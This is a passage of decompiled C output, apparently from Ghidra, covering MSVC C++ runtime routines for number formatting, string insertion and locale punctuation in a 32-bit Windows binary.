  undefined in_stack_ffffffa4;
  char local_50 [68];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xffffffa4;
  _Format = (char *)FUN_003a8540(param_6,*(uint *)(param_4 + 0x14));
  sVar1 = _sprintf_s(local_50,0x40,_Format,param_6,param_7);
  FUN_003a85c0(extraout_ECX & 0xffffff00 | (uint)param_5,local_50,param_1,param_4,sVar1,param_2,
               param_3);
  terminate_if_debugger_present(local_c ^ (uint)&stack0xffffffa4,extraout_EDX,in_stack_ffffffa4);
  return;
}



void FUN_003a79b0(undefined4 param_1,undefined4 param_2,int *param_3,uint param_4,byte param_5,
                 double param_6)

{
  int iVar1;
  undefined2 *puVar2;
  char cVar3;
  undefined4 extraout_EDX;
  void *pvVar4;
  uint uVar5;
  void *pvVar6;
  uint uVar7;
  bool bVar8;
  undefined in_stack_ffffff0c;
  uint local_cc;
  char local_c0;
  undefined local_bf;
  undefined2 local_be;
  undefined auStack188 [4];
  undefined4 **local_b8 [29];
  uint local_44;
  
  local_44 = DAT_003d6664 ^ (uint)&stack0xffffff0c;
  iVar1 = *(int *)(param_4 + 0x1c);
  uVar5 = *(uint *)(param_4 + 0x18);
  if ((iVar1 < 1) && (((iVar1 < 0 || (uVar5 == 0)) && ((*(uint *)(param_4 + 0x14) & 0x2000) == 0))))
  {
    uVar5 = 6;
    iVar1 = 0;
  }
  local_cc = uVar5;
  if ((-1 < iVar1) && ((0 < iVar1 || (0x24 < uVar5)))) {
    local_cc = 0x24;
  }
  pvVar6 = (void *)(uVar5 - local_cc);
  iVar1 = (iVar1 - ((int)local_cc >> 0x1f)) - (uint)(uVar5 < local_cc);
  uVar5 = *(uint *)(param_4 + 0x14);
  pvVar4 = (void *)0x0;
  uVar7 = 0;
  if (((uVar5 & 0x3000) == 0x2000) && (param_6 != param_6 * 0.5)) {
    if ((ushort)((ushort)(0.0 < param_6) << 8 | (ushort)(param_6 == 0.0) << 0xe) == 0) {
      param_6 = -param_6;
    }
    if (1e+35 < param_6 != (param_6 == 1e+35)) {
      do {
        if ((void *)0x1387 < pvVar4) break;
        param_6 = param_6 / 10000000000.0;
        pvVar4 = (void *)((int)pvVar4 + 10);
      } while (1e+35 < param_6 != (param_6 == 1e+35));
    }
    if ((0.0 < param_6) && (-1 < iVar1)) {
      if (0 < iVar1) goto LAB_003a7ac7;
      while ((void *)0x9 < pvVar6) {
LAB_003a7ac7:
        do {
          if ((1e-35 < param_6) || (4999 < uVar7)) goto LAB_003a7afd;
          bVar8 = (void *)0x9 < pvVar6;
          pvVar6 = (void *)((int)pvVar6 - 10);
          iVar1 = iVar1 + -1 + (uint)bVar8;
          param_6 = param_6 * 10000000000.0;
          uVar7 = uVar7 + 10;
        } while (0 < iVar1);
        if (iVar1 < 0) break;
      }
    }
  }
LAB_003a7afd:
  local_c0 = '%';
  puVar2 = (undefined2 *)&local_bf;
  if ((uVar5 & 0x20) != 0) {
    local_bf = 0x2b;
    puVar2 = &local_be;
  }
  if ((uVar5 & 0x10) != 0) {
    *(undefined *)puVar2 = 0x23;
    puVar2 = (undefined2 *)((int)puVar2 + 1);
  }
  uVar5 = uVar5 & 0x3000;
  *puVar2 = 0x2a2e;
  if (uVar5 == 0x2000) {
    cVar3 = 'f';
  }
  else {
    if (uVar5 == 0x3000) {
      cVar3 = 'a';
    }
    else {
      cVar3 = (uVar5 != 0x1000) * '\x02' + 'e';
    }
  }
  *(char *)(puVar2 + 1) = cVar3;
  *(undefined *)((int)puVar2 + 3) = 0;
  uVar5 = _sprintf_s((char *)local_b8,0x6c,&local_c0,local_cc);
  FUN_003a7fd0(param_4 & 0xffffff00 | (uint)param_5,pvVar4,param_1,param_4,local_b8,uVar7,pvVar6,
               uVar5,param_2,param_3);
  terminate_if_debugger_present(local_44 ^ (uint)&stack0xffffff0c,extraout_EDX,in_stack_ffffff0c);
  return;
}



void FUN_003a7bc0(undefined4 param_1,undefined4 param_2,int *param_3,uint param_4,byte param_5,
                 double param_6)

{
  int iVar1;
  undefined2 *puVar2;
  char cVar3;
  undefined4 extraout_EDX;
  void *pvVar4;
  uint uVar5;
  void *pvVar6;
  uint uVar7;
  bool bVar8;
  undefined in_stack_ffffff0c;
  uint local_cc;
  char local_c0;
  undefined local_bf;
  undefined2 local_be;
  char acStack188 [4];
  undefined4 **local_b8 [29];
  uint local_44;
  
  local_44 = DAT_003d6664 ^ (uint)&stack0xffffff0c;
  iVar1 = *(int *)(param_4 + 0x1c);
  uVar5 = *(uint *)(param_4 + 0x18);
  if ((iVar1 < 1) && (((iVar1 < 0 || (uVar5 == 0)) && ((*(uint *)(param_4 + 0x14) & 0x2000) == 0))))
  {
    uVar5 = 6;
    iVar1 = 0;
  }
  local_cc = uVar5;
  if ((-1 < iVar1) && ((0 < iVar1 || (0x24 < uVar5)))) {
    local_cc = 0x24;
  }
  pvVar6 = (void *)(uVar5 - local_cc);
  iVar1 = (iVar1 - ((int)local_cc >> 0x1f)) - (uint)(uVar5 < local_cc);
  uVar5 = *(uint *)(param_4 + 0x14);
  pvVar4 = (void *)0x0;
  uVar7 = 0;
  if ((uVar5 & 0x3000) == 0x2000) {
    if (param_6 < 0.0) {
      param_6 = -param_6;
    }
    if (1e+35 < param_6 != (param_6 == 1e+35)) {
      do {
        if ((void *)0x1387 < pvVar4) break;
        param_6 = param_6 / 10000000000.0;
        pvVar4 = (void *)((int)pvVar4 + 10);
      } while (1e+35 < param_6 != (param_6 == 1e+35));
    }
    if ((0.0 < param_6) && (-1 < iVar1)) {
      if (0 < iVar1) goto LAB_003a7cbc;
      while ((void *)0x9 < pvVar6) {
LAB_003a7cbc:
        do {
          if ((1e-35 < param_6) || (4999 < uVar7)) goto LAB_003a7cfb;
          bVar8 = (void *)0x9 < pvVar6;
          pvVar6 = (void *)((int)pvVar6 - 10);
          iVar1 = iVar1 + -1 + (uint)bVar8;
          param_6 = param_6 * 10000000000.0;
          uVar7 = uVar7 + 10;
        } while (0 < iVar1);
        if (iVar1 < 0) break;
      }
    }
  }
LAB_003a7cfb:
  local_c0 = '%';
  puVar2 = (undefined2 *)&local_bf;
  if ((uVar5 & 0x20) != 0) {
    local_bf = 0x2b;
    puVar2 = &local_be;
  }
  if ((uVar5 & 0x10) != 0) {
    *(undefined *)puVar2 = 0x23;
    puVar2 = (undefined2 *)((int)puVar2 + 1);
  }
  uVar5 = uVar5 & 0x3000;
  *puVar2 = 0x2a2e;
  *(undefined *)(puVar2 + 1) = 0x4c;
  if (uVar5 == 0x2000) {
    cVar3 = 'f';
  }
  else {
    if (uVar5 == 0x3000) {
      cVar3 = 'a';
    }
    else {
      cVar3 = (uVar5 != 0x1000) * '\x02' + 'e';
    }
  }
  *(char *)((int)puVar2 + 3) = cVar3;
  *(undefined *)(puVar2 + 2) = 0;
  uVar5 = _sprintf_s((char *)local_b8,0x6c,&local_c0,local_cc);
  FUN_003a7fd0(param_4 & 0xffffff00 | (uint)param_5,pvVar4,param_1,param_4,local_b8,uVar7,pvVar6,
               uVar5,param_2,param_3);
  terminate_if_debugger_present(local_44 ^ (uint)&stack0xffffff0c,extraout_EDX,in_stack_ffffff0c);
  return;
}



void FUN_003a7dc0(undefined4 param_1,undefined4 param_2,int *param_3,int param_4,byte param_5,
                 undefined4 param_6)

{
  uint uVar1;
  size_t sVar2;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  char in_stack_ffffffb0;
  
  uVar1 = DAT_003d6664 ^ (uint)&stack0xffffffb0;
  sVar2 = _sprintf_s(&stack0xffffffb0,0x40,"%p",param_6);
  FUN_003a85c0(extraout_ECX & 0xffffff00 | (uint)param_5,&stack0xffffffb0,param_1,param_4,sVar2,
               param_2,param_3);
  terminate_if_debugger_present(uVar1 ^ (uint)&stack0xffffffb0,extraout_EDX,in_stack_ffffffb0);
  return;
}



void FUN_003a7e30(uint param_1,byte param_2)

{
  int *piVar1;
  int **ppiVar2;
  int *in_EAX;
  int *piVar3;
  int **ppiVar4;
  uint extraout_ECX;
  uint uVar5;
  int **unaff_EDI;
  
  piVar3 = unaff_EDI[4];
  if (piVar3 < in_EAX) {
    piVar3 = (int *)FUN_003ae39d("invalid string position");
  }
  uVar5 = param_1;
  if (-(int)piVar3 - 1U <= param_1) {
    piVar3 = (int *)FUN_003ae350("string too long");
    uVar5 = extraout_ECX;
  }
  if (uVar5 != 0) {
    piVar1 = (int *)((int)piVar3 + uVar5);
    if (piVar1 == (int *)0xffffffff) {
      piVar3 = (int *)FUN_003ae350("string too long");
    }
    if (unaff_EDI[5] < piVar1) {
      FUN_00389950(unaff_EDI,piVar1,piVar3);
      if (piVar1 == (int *)0x0) {
        return;
      }
    }
    else {
      if (piVar1 == (int *)0x0) {
        unaff_EDI[4] = (int *)0x0;
        if (unaff_EDI[5] < (int *)0x10) {
          *(undefined *)unaff_EDI = 0;
          return;
        }
        *(undefined *)*unaff_EDI = 0;
        return;
      }
    }
    ppiVar4 = unaff_EDI;
    ppiVar2 = unaff_EDI;
    if ((int *)0xf < unaff_EDI[5]) {
      ppiVar4 = (int **)*unaff_EDI;
      ppiVar2 = (int **)*unaff_EDI;
    }
    FID_conflict__memcpy
              ((void *)((int)ppiVar4 + (int)in_EAX + param_1),
               (undefined *)((int)ppiVar2 + (int)in_EAX),(int)unaff_EDI[4] - (int)in_EAX);
    FUN_00395b90(param_1,param_2);
    unaff_EDI[4] = piVar1;
    if ((int *)0xf < unaff_EDI[5]) {
      *(undefined *)((int)*unaff_EDI + (int)piVar1) = 0;
      return;
    }
    *(undefined *)((int)unaff_EDI + (int)piVar1) = 0;
  }
  return;
}



void __fastcall FUN_003a7f20(int *param_1)

{
  int iVar1;
  void *this;
  uint uVar2;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c33d0;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  local_8 = 0;
  iVar1 = *(int *)(*param_1 + 4);
  if ((*(byte *)(iVar1 + 0x14 + (int)param_1) & 2) != 0) {
    uVar2 = 0;
    if ((*(byte *)(iVar1 + 0xc + (int)param_1) & 6) == 0) {
      iVar1 = (**(code **)(**(int **)(iVar1 + 0x38 + (int)param_1) + 0x34))();
      if (iVar1 == -1) {
        uVar2 = 4;
      }
    }
    this = (void *)(*(int *)(*param_1 + 4) + (int)param_1);
    if (uVar2 != 0) {
      uVar2 = *(uint *)((int)this + 0xc) | uVar2;
      if (*(int *)((int)this + 0x38) == 0) {
        uVar2 = uVar2 | 4;
      }
      *(uint *)((int)this + 0xc) = uVar2 & 0x17;
      if ((*(uint *)((int)this + 0x10) & uVar2 & 0x17) != 0) {
        FUN_00399780(this,(char *)0x0);
      }
    }
  }
  *in_FS_OFFSET = local_10;
  return;
}



undefined4 _GOST_KEY_TRANSPORT_it(void)

{
  return 0x3a7fa9;
}



// WARNING: Could not reconcile some variable overlaps

void __fastcall
FUN_003a7fd0(undefined4 param_1,void *param_2,undefined4 param_3,int param_4,undefined4 ***param_5,
            uint param_6,void *param_7,uint param_8,undefined4 param_9,int *param_10)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  int *piVar4;
  lconv *plVar5;
  void *pvVar6;
  undefined4 *****_Str;
  size_t sVar7;
  uint uVar8;
  undefined4 *puVar9;
  undefined *this;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar10;
  undefined4 ***pppuVar11;
  code **ppcVar12;
  size_t _MaxCount;
  int **in_FS_OFFSET;
  undefined in_stack_ffffff74;
  uint local_88;
  undefined4 local_84;
  void *local_80;
  int local_7c;
  undefined4 local_78;
  int *local_74;
  uint local_70;
  uint local_6c;
  void *local_68;
  char local_64;
  undefined2 local_63;
  void *local_60;
  void *local_5c;
  size_t local_58;
  undefined local_52;
  undefined local_51;
  undefined4 *****local_50;
  undefined4 ***local_4c [5];
  uint local_38;
  undefined4 *****local_30 [4];
  size_t local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c339b;
  local_10 = *in_FS_OFFSET;
  uVar3 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_70 = param_6;
  local_7c = param_4;
  local_50 = (undefined4 *****)param_5;
  local_60 = param_7;
  local_58 = param_8;
  local_68 = param_2;
  local_52 = (undefined)param_1;
  local_14 = uVar3;
  FUN_00399850();
  local_8 = 0;
  piVar4 = (int *)FUN_003a8cf0();
  local_8 = 0xffffffff;
  local_74 = piVar4;
  if (local_88 != 0) {
    local_6c = local_88;
    std::_Lockit::_Lockit((_Lockit *)&local_5c,0);
    iVar2 = *(int *)(local_88 + 4);
    if ((iVar2 != 0) && (iVar2 != -1)) {
      *(int *)(local_88 + 4) = iVar2 + -1;
    }
    iVar2 = *(int *)(local_88 + 4);
    FUN_003ae995((int *)&local_5c);
    ppcVar12 = (code **)(~-(uint)(iVar2 != 0) & local_6c);
    if (ppcVar12 != (code **)0x0) {
      (**(code **)*ppcVar12)(1);
    }
  }
  FUN_003a8b70(piVar4);
  local_8 = 1;
  local_51 = (**(code **)(*piVar4 + 8))(uVar3);
  local_1c = 0xf;
  local_20 = 0;
  local_30[0] = (undefined4 *****)((uint)local_30[0] & 0xffffff00);
  local_8 = CONCAT31(local_8._1_3_,2);
  if ((*(char *)param_5 == '+') || (local_6c = 0, *(char *)param_5 == '-')) {
    local_6c = 1;
  }
  plVar5 = _localeconv();
  _MaxCount = local_58;
  local_64 = *plVar5->decimal_point;
  local_63 = 0x65;
  local_5c = _memchr(param_5,0x65,local_58);
  pvVar6 = _memchr(param_5,(int)local_64,_MaxCount);
  if (pvVar6 == (void *)0x0) {
    local_60 = pvVar6;
  }
  pppuVar11 = local_4c[0];
  if (local_38 < 0x10) {
    pppuVar11 = local_4c;
  }
  local_80 = pvVar6;
  if (*(char *)pppuVar11 != '\x7f') {
    pppuVar11 = local_4c[0];
    if (local_38 < 0x10) {
      pppuVar11 = local_4c;
    }
    if ('\0' < *(char *)pppuVar11) {
      FUN_00395d90(local_30,_MaxCount);
      if (local_5c == (void *)0x0) {
        FUN_00396020(0x30);
      }
      else {
        if (pvVar6 == (void *)0x0) {
          FUN_00396020(0x30);
          local_68 = pvVar6;
        }
        FUN_003a7e30((uint)local_60,0x30);
        pvVar6 = local_80;
      }
      if (pvVar6 == (void *)0x0) {
        FUN_00396020(0x30);
      }
      else {
        FUN_003a7e30(local_70,0x30);
        FUN_003a7e30((uint)local_68,0x30);
        local_70 = 0;
      }
      local_68 = (void *)0x0;
      pppuVar11 = local_4c[0];
      if (local_38 < 0x10) {
        pppuVar11 = local_4c;
      }
      _Str = local_30[0];
      if (local_1c < 0x10) {
        _Str = local_30;
      }
      sVar7 = _strcspn((char *)_Str,&local_64);
      cVar1 = *(char *)pppuVar11;
      _MaxCount = local_20;
      while (((local_20 = _MaxCount, cVar1 != '\x7f' && ('\0' < cVar1)) &&
             ((uint)(int)cVar1 < sVar7 - local_6c))) {
        sVar7 = sVar7 - (int)cVar1;
        FUN_003a7e30(1,0);
        if ('\0' < *(char *)((int)pppuVar11 + 1)) {
          pppuVar11 = (undefined4 ***)((int)pppuVar11 + 1);
        }
        _MaxCount = local_20;
        cVar1 = *(char *)pppuVar11;
      }
      local_50 = local_30[0];
      if (local_1c < 0x10) {
        local_50 = local_30;
      }
      local_60 = (void *)0x0;
      param_5 = local_50;
      local_58 = _MaxCount;
    }
  }
  uVar3 = *(uint *)(local_7c + 0x20);
  uVar8 = (int)local_60 + local_70 + _MaxCount + (int)local_68;
  if (((*(int *)(local_7c + 0x24) < 0) || ((*(int *)(local_7c + 0x24) < 1 && (uVar3 == 0)))) ||
     (uVar3 <= uVar8)) {
    local_5c = (void *)0x0;
  }
  else {
    local_5c = (void *)(uVar3 - uVar8);
  }
  uVar3 = *(uint *)(local_7c + 0x14) & 0x1c0;
  if (uVar3 != 0x40) {
    if (uVar3 == 0x100) {
      if (local_6c != 0) {
        puVar9 = (undefined4 *)FUN_003a8a30(param_5,&local_84,param_9,param_10);
        param_9 = *puVar9;
        local_50 = (undefined4 *****)((int)param_5 + 1);
        param_10 = (int *)puVar9[1];
        local_58 = _MaxCount - 1;
      }
      puVar9 = (undefined4 *)FUN_003a8860(param_9,param_10);
      param_9 = *puVar9;
      param_10 = (int *)puVar9[1];
    }
    else {
      puVar9 = (undefined4 *)FUN_003a8860(param_9,param_10);
      param_9 = *puVar9;
      param_10 = (int *)puVar9[1];
    }
    local_5c = (void *)0x0;
    param_5 = local_50;
    _MaxCount = local_58;
  }
  pvVar6 = _memchr(param_5,(int)local_64,_MaxCount);
  if (pvVar6 != (void *)0x0) {
    iVar2 = ((int)pvVar6 - (int)param_5) + 1;
    puVar9 = FUN_003a8aa0(&local_84,(int)pvVar6 - (int)param_5,param_9,param_10);
    puVar9 = (undefined4 *)FUN_003a8860(*puVar9,(int *)puVar9[1]);
    uVar10 = *puVar9;
    piVar4 = (int *)puVar9[1];
    (**(code **)(*local_74 + 4))();
    puVar9 = (undefined4 *)FUN_003a8860(uVar10,piVar4);
    puVar9 = (undefined4 *)FUN_003a8860(*puVar9,(int *)puVar9[1]);
    param_9 = *puVar9;
    param_5 = (undefined4 ***)((int)local_50 + iVar2);
    _MaxCount = local_58 - iVar2;
    param_10 = (int *)puVar9[1];
    local_58 = _MaxCount;
    local_50 = (undefined4 *****)param_5;
  }
  pvVar6 = _memchr(param_5,0x65,_MaxCount);
  if (pvVar6 != (void *)0x0) {
    iVar2 = ((int)pvVar6 - (int)param_5) + 1;
    puVar9 = FUN_003a8aa0(&local_78,(int)pvVar6 - (int)param_5,param_9,param_10);
    puVar9 = (undefined4 *)FUN_003a8860(*puVar9,(int *)puVar9[1]);
    local_60 = (void *)0x0;
    this = &DAT_003d1654;
    if ((*(byte *)(local_7c + 0x14) & 4) == 0) {
      this = &DAT_003d0e40;
    }
    puVar9 = (undefined4 *)FUN_003a8a30(this,&local_78,*puVar9,(int *)puVar9[1]);
    param_9 = *puVar9;
    local_50 = (undefined4 *****)((int)local_50 + iVar2);
    _MaxCount = local_58 - iVar2;
    param_10 = (int *)puVar9[1];
    local_58 = _MaxCount;
  }
  puVar9 = FUN_003a8aa0(&local_78,_MaxCount,param_9,param_10);
  puVar9 = (undefined4 *)FUN_003a8860(*puVar9,(int *)puVar9[1]);
  uVar10 = *puVar9;
  piVar4 = (int *)puVar9[1];
  *(undefined4 *)(local_7c + 0x20) = 0;
  *(undefined4 *)(local_7c + 0x24) = 0;
  FUN_003a8860(uVar10,piVar4);
  uVar10 = extraout_EDX;
  if (0xf < local_1c) {
    FUN_003aee4b(local_30[0]);
    uVar10 = extraout_EDX_00;
  }
  local_1c = 0xf;
  local_20 = 0;
  local_30[0] = (undefined4 *****)((uint)local_30[0] & 0xffffff00);
  if (0xf < local_38) {
    FUN_003aee4b(local_4c[0]);
    uVar10 = extraout_EDX_01;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar10,in_stack_ffffff74);
  return;
}



void __fastcall FUN_003a8540(undefined4 param_1,uint param_2)

{
  undefined *in_EAX;
  undefined2 *puVar1;
  byte *pbVar2;
  char *unaff_EDI;
  
  *in_EAX = 0x25;
  puVar1 = (undefined2 *)(in_EAX + 1);
  if ((param_2 & 0x20) != 0) {
    *(undefined *)puVar1 = 0x2b;
    puVar1 = (undefined2 *)(in_EAX + 2);
  }
  if ((param_2 & 8) != 0) {
    *(undefined *)puVar1 = 0x23;
    puVar1 = (undefined2 *)((int)puVar1 + 1);
  }
  if (*unaff_EDI == 'L') {
    *puVar1 = 0x3649;
    *(undefined *)(puVar1 + 1) = 0x34;
    pbVar2 = (byte *)((int)puVar1 + 3);
  }
  else {
    *(char *)puVar1 = *unaff_EDI;
    pbVar2 = (byte *)((int)puVar1 + 1);
  }
  if ((param_2 & 0xe00) == 0x400) {
    *pbVar2 = 0x6f;
    pbVar2[1] = 0;
    return;
  }
  if ((param_2 & 0xe00) != 0x800) {
    *pbVar2 = unaff_EDI[1];
    pbVar2[1] = 0;
    return;
  }
  *pbVar2 = ~((char)param_2 * '\b') & 0x20U | 0x58;
  pbVar2[1] = 0;
  return;
}



// WARNING: Type propagation algorithm not settling

void __fastcall
FUN_003a85c0(undefined4 param_1,char *param_2,undefined4 param_3,int param_4,size_t param_5,
            undefined4 param_6,int *param_7)

{
  char cVar1;
  int iVar2;
  size_t sVar3;
  int *piVar4;
  undefined4 *******pppppppuVar5;
  rsize_t _DstSize;
  uint uVar6;
  undefined4 *puVar7;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar8;
  code **ppcVar9;
  size_t sVar10;
  char *pcVar11;
  int **in_FS_OFFSET;
  undefined in_stack_ffffffa0;
  uint local_58;
  undefined4 local_50;
  undefined4 *******local_4c;
  int local_44;
  char *local_40;
  size_t local_3c;
  undefined local_35;
  undefined4 *******local_34 [5];
  uint local_20;
  uint local_18;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c2e20;
  local_10 = *in_FS_OFFSET;
  local_18 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_3c = param_5;
  local_40 = param_2;
  local_35 = (undefined)param_1;
  FUN_00399850();
  local_8 = 0;
  piVar4 = (int *)FUN_003a8cf0();
  local_8 = 0xffffffff;
  if (local_58 != 0) {
    std::_Lockit::_Lockit((_Lockit *)&local_44,0);
    iVar2 = *(int *)(local_58 + 4);
    if ((iVar2 != 0) && (iVar2 != -1)) {
      *(int *)(local_58 + 4) = iVar2 + -1;
    }
    iVar2 = *(int *)(local_58 + 4);
    FUN_003ae995(&local_44);
    ppcVar9 = (code **)(~-(uint)(iVar2 != 0) & local_58);
    if (ppcVar9 != (code **)0x0) {
      (**(code **)*ppcVar9)(1);
    }
  }
  FUN_003a8b70(piVar4);
  local_8 = 1;
  cVar1 = *local_40;
  if ((cVar1 == '+') || (cVar1 == '-')) {
    local_44 = 1;
  }
  else {
    if ((cVar1 == '0') && ((local_40[1] == 'x' || (local_40[1] == 'X')))) {
      local_44 = 2;
    }
    else {
      local_44 = 0;
    }
  }
  pppppppuVar5 = local_34[0];
  if (local_20 < 0x10) {
    pppppppuVar5 = local_34;
  }
  sVar3 = local_3c;
  if (*(char *)pppppppuVar5 != '\x7f') {
    pppppppuVar5 = local_34[0];
    if (local_20 < 0x10) {
      pppppppuVar5 = local_34;
    }
    if ('\0' < *(char *)pppppppuVar5) {
      if (local_20 < 0x10) {
        local_4c = local_34;
      }
      else {
        local_4c = local_34[0];
      }
      cVar1 = *(char *)local_4c;
      sVar10 = param_5;
      while (((cVar1 != '\x7f' && (sVar3 = param_5, '\0' < cVar1)) &&
             (sVar3 = param_5, (uint)(int)cVar1 < sVar10 - local_44))) {
        sVar10 = sVar10 - (int)cVar1;
        _DstSize = (param_5 - sVar10) + 1;
        pcVar11 = local_40 + sVar10;
        _memmove_s(local_40 + sVar10 + 1,_DstSize,pcVar11,_DstSize);
        *pcVar11 = '\0';
        param_5 = param_5 + 1;
        if ('\0' < *(char *)((int)local_4c + 1)) {
          local_4c = (undefined4 *******)((int)local_4c + 1);
        }
        sVar3 = param_5;
        cVar1 = *(char *)local_4c;
      }
    }
  }
  local_3c = sVar3;
  pcVar11 = local_40;
  uVar6 = *(uint *)(param_4 + 0x14) & 0x1c0;
  if (uVar6 != 0x40) {
    if (uVar6 == 0x100) {
      puVar7 = (undefined4 *)FUN_003a8a30(local_40,&local_50,param_6,param_7);
      local_40 = pcVar11 + local_44;
      local_3c = param_5 - local_44;
      puVar7 = (undefined4 *)FUN_003a8860(*puVar7,(int *)puVar7[1]);
      param_6 = *puVar7;
      param_7 = (int *)puVar7[1];
      param_5 = local_3c;
    }
    else {
      puVar7 = (undefined4 *)FUN_003a8860(param_6,param_7);
      param_6 = *puVar7;
      param_7 = (int *)puVar7[1];
      param_5 = local_3c;
    }
  }
  (**(code **)(*piVar4 + 8))();
  puVar7 = FUN_003a8aa0((undefined4 *)&stack0xffffffa0,param_5,param_6,param_7);
  uVar8 = *puVar7;
  piVar4 = (int *)puVar7[1];
  *(undefined4 *)(param_4 + 0x20) = 0;
  *(undefined4 *)(param_4 + 0x24) = 0;
  FUN_003a8860(uVar8,piVar4);
  uVar8 = extraout_EDX;
  if (0xf < local_20) {
    FUN_003aee4b(local_34[0]);
    uVar8 = extraout_EDX_00;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar8,in_stack_ffffffa0);
  return;
}



void __cdecl FUN_003a8860(undefined4 param_1,int *param_2)

{
  int *piVar1;
  byte *pbVar2;
  int in_EAX;
  uint uVar3;
  byte unaff_BL;
  undefined4 *unaff_EDI;
  
  if (in_EAX != 0) {
    do {
      if (param_2 == (int *)0x0) {
LAB_003a88aa:
        param_1 = CONCAT31(param_1._1_3_,1);
      }
      else {
        if ((*(int *)param_2[9] == 0) || (piVar1 = (int *)param_2[0xd], *piVar1 < 1)) {
          uVar3 = (**(code **)(*param_2 + 0xc))(unaff_BL);
        }
        else {
          *piVar1 = *piVar1 + -1;
          pbVar2 = *(byte **)param_2[9];
          *(byte **)param_2[9] = pbVar2 + 1;
          *pbVar2 = unaff_BL;
          uVar3 = (uint)unaff_BL;
        }
        if (uVar3 == 0xffffffff) goto LAB_003a88aa;
      }
      in_EAX = in_EAX + -1;
    } while (in_EAX != 0);
  }
  *unaff_EDI = param_1;
  unaff_EDI[1] = param_2;
  return;
}



void __fastcall FUN_003a88c0(int *param_1)

{
  (**(code **)(*param_1 + 0x10))();
  return;
}



void __fastcall FUN_003a88e0(int *param_1)

{
  (**(code **)(*param_1 + 0x14))();
  return;
}



undefined __fastcall FUN_003a8900(int param_1)

{
  return *(undefined *)(param_1 + 0xc);
}



undefined __fastcall FUN_003a8910(int param_1)

{
  return *(undefined *)(param_1 + 0xd);
}



undefined * __thiscall FUN_003a8920(void *this,undefined *param_1)

{
  int **_Str;
  int *piVar1;
  
  _Str = *(int ***)((int)this + 8);
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  piVar1 = (int *)_strlen((char *)_Str);
  FUN_003894c0(param_1,_Str,piVar1);
  return param_1;
}



undefined * __thiscall FUN_003a8960(void *this,undefined *param_1)

{
  int **_Str;
  int *piVar1;
  
  _Str = *(int ***)((int)this + 0x10);
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  piVar1 = (int *)_strlen((char *)_Str);
  FUN_003894c0(param_1,_Str,piVar1);
  return param_1;
}



undefined * __thiscall FUN_003a89a0(void *this,undefined *param_1)

{
  int **_Str;
  int *piVar1;
  
  _Str = *(int ***)((int)this + 0x14);
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  piVar1 = (int *)_strlen((char *)_Str);
  FUN_003894c0(param_1,_Str,piVar1);
  return param_1;
}



undefined ** __thiscall FUN_003a89e0(void *this,byte param_1)

{
  *(undefined ***)this = std::numpunct<char>::vftable;
  FUN_003b14b9(*(void **)((int)this + 8));
  FUN_003b14b9(*(void **)((int)this + 0x10));
  FUN_003b14b9(*(void **)((int)this + 0x14));
  *(undefined ***)this = std::locale::facet::vftable;
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



void __thiscall FUN_003a8a30(void *this,undefined4 *param_1,undefined4 param_2,int *param_3)

{
  byte bVar1;
  int *piVar2;
  byte *pbVar3;
  int in_EAX;
  uint uVar4;
  
  if (in_EAX != 0) {
    do {
      if (param_3 == (int *)0x0) {
LAB_003a8a7d:
        param_2 = CONCAT31(param_2._1_3_,1);
      }
      else {
                    // WARNING: Load size is inaccurate
        bVar1 = *this;
        if ((*(int *)param_3[9] == 0) || (piVar2 = (int *)param_3[0xd], *piVar2 < 1)) {
          uVar4 = (**(code **)(*param_3 + 0xc))(bVar1);
        }
        else {
          *piVar2 = *piVar2 + -1;
          pbVar3 = *(byte **)param_3[9];
          *(byte **)param_3[9] = pbVar3 + 1;
          *pbVar3 = bVar1;
          uVar4 = (uint)bVar1;
        }
        if (uVar4 == 0xffffffff) goto LAB_003a8a7d;
      }
      this = (void *)((int)this + 1);
      in_EAX = in_EAX + -1;
    } while (in_EAX != 0);
  }
  *param_1 = param_2;
  param_1[1] = param_3;
  return;
}



// WARNING: Could not reconcile some variable overlaps

undefined4 * __cdecl
FUN_003a8aa0(undefined4 *param_1,size_t param_2,undefined4 param_3,int *param_4)

{
  int *piVar1;
  byte *pbVar2;
  undefined4 uVar3;
  void *in_EAX;
  void *pvVar4;
  size_t sVar5;
  undefined4 *puVar6;
  uint uVar7;
  byte unaff_BL;
  undefined4 local_14 [2];
  undefined4 local_c;
  
  do {
    pvVar4 = _memchr(in_EAX,0,param_2);
    sVar5 = param_2;
    if (pvVar4 != (void *)0x0) {
      sVar5 = (int)pvVar4 - (int)in_EAX;
    }
    puVar6 = (undefined4 *)FUN_003a8a30(in_EAX,local_14,param_3,param_4);
    param_3 = *puVar6;
    param_4 = (int *)puVar6[1];
    if (param_2 - sVar5 == 0) {
      uVar3 = *puVar6;
      param_1[1] = puVar6[1];
      *param_1 = uVar3;
      return param_1;
    }
    if (unaff_BL != 0) {
      param_4 = (int *)puVar6[1];
      local_c = *puVar6;
      if (param_4 == (int *)0x0) {
